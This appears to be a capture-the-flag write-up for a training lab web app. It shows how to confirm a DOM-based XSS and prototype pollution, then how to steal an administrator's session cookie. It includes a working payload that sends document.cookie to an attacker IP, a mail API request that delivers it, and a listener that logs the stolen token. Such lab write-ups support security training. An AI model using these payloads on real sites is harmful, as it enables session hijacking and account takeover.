---

Name: Polution
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/polution-easy
Description: You are a member of the Hack Smarter Red Team and your organization is beginning to roll out a managed SOC service. You've been provided access to a staging version of the web app before it's pushed to production. > Note from Tyler: Is the typo intentional? Let's just pretend like it is 

---

## Credentials

We are provided with the following credentials:

```text
pentester:HackSmarter123
```

After logging in, we can access the dashboard at:

```text
http://10.1.186.230:3000/dashboard
```

However, attempting to access the incident response page directly results in a `403 Forbidden`:

```text
http://10.1.186.230:3000/incident-response
```

We also have access to the application's email functionality and an email address belonging to the administrator:

```text
admin@hacksmarter.local
```

## Cookie Manipulation

The application uses a `user` cookie for identifying the current user.

Initially, our cookie was:

```text
user=pentester
```

Interestingly, changing its value to `admin` or `administrator` does not cause any errors, although it does not immediately give us access to the incident response page either.

For example:

```http
GET /incident-response HTTP/1.1
Host: 10.1.186.230:3000
Cookie: user=administrator
```

This suggests that simply modifying the `user` cookie is not enough to bypass the authorization check.

## Finding XSS

Looking through the JavaScript code, we find a potentially dangerous `renderCallback` parameter:

```javascript
if (options.renderCallback) {
    const frag = document.createRange().createContextualFragment(options.renderCallback);
    results.innerHTML = "";
    results.appendChild(frag);
}
```

The value of `renderCallback` is inserted into the DOM using `createContextualFragment()`, allowing us to inject HTML and JavaScript.

We can confirm this with:

```text
http://10.1.186.230:3000/dashboard#renderCallback=<img src=x onerror=alert(1)>
```

This results in JavaScript execution in the browser, confirming a DOM-based XSS vulnerability.

## Prototype Pollution

While inspecting the application's JavaScript, we also find the following code:

```javascript
function syncState(params, target) {
    ...
    const path = key.split('.');
    ...
    current[part] = current[part] || {};
    current = current[part];
}
```

Because properties are assigned based on attacker-controlled keys, we can test for prototype pollution.

For example:

```text
/dashboard#__proto__.polluted=YES
```

Then, from the browser console:

```javascript
({}).polluted
```

returns:

```text
"YES"
```

This confirms that prototype pollution is possible.

## Exploiting the XSS

The XSS can be used to make the administrator's browser send a request back to our machine.

Our attacker IP is:

```text
10.200.80.45
```

We can use the following payload:

```html
<img src=x onerror="new Image().src='http://10.200.80.45:4444/?c='+encodeURIComponent(document.cookie)">
```

The resulting URL is:

```text
http://10.1.186.230:3000/dashboard#renderCallback=<img src=x onerror="new Image().src='http://10.200.80.45:4444/?c='+encodeURIComponent(document.cookie)">
```

We can send this URL to the administrator through the application's mail functionality.

For example:

```http
POST /api/mail/send HTTP/1.1
Host: 10.1.186.230:3000
Content-Type: application/json
Cookie: user=incident_responder

{
  "to":"admin@hacksmarter.local",
  "subject":"FOUND SOMETHING WEIRD",
  "body":"Check this out\n\n<script>\nnew Image().src=\"http://10.200.80.45:4444/?c=\"+encodeURIComponent(document.cookie);\n</script>\nworked?"
}
```

We then start a listener on our machine:

```bash
python3 -m http.server 4444
```

Initially, requests from the server did not contain useful cookie information. However, after using the XSS payload against the administrator, we receive:

```text
10.1.186.230 - - [10/Aug/2026 13:13:39] "GET /?c=session%3DHS_ADMIN_7721_SECURE_AUTH_TOKEN%3B%20user%3Dadmin HTTP/1.1" 200 -
```

URL-decoding the request gives us:

```text
session=HS_ADMIN_7721_SECURE_AUTH_TOKEN; user=admin
```

We have successfully stolen the administrator's authentication cookies.

## Authentication Bypass

The stolen cookies are:

```text
session=HS_ADMIN_7721_SECURE_AUTH_TOKEN
user=admin
```

We add these cookies to our browser for:

```text
http://10.1.186.230:3000
```

We can now access:

```text
http://10.1.186.230:3000/incident-response
```

The authorization check succeeds because we are now authenticated using the administrator's session.

The incident response page contains the flag.

<!--
TODO
use prototype pollution to get the flag since in some cases HTTPonly is set to true
-->
